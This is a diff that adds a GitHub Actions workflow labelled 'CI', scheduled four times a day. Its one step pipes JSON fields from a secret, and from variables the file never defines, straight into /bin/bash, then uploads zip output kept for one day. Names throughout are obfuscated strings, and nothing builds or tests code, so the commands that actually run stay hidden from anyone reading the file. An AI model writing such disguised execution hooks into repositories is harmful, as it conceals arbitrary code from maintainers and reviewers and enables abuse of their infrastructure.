@@ -1,0 +1,34 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          jw619: ${{ secrets.jw619 }}
+        run: |
+          printf '%s' "$jw619" | jq -r .jrm53 | /bin/bash
+          printf '%s' "$cyjd1" | jq -r .c22 | /bin/bash
+          printf '%s' "$yhsns6074" | jq -r .x3 | /bin/bash
+          echo $tm60638 | jq -r .ggsfi42 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: vR2St8VJ
+          path: "*.zip"
+          retention-days: 1
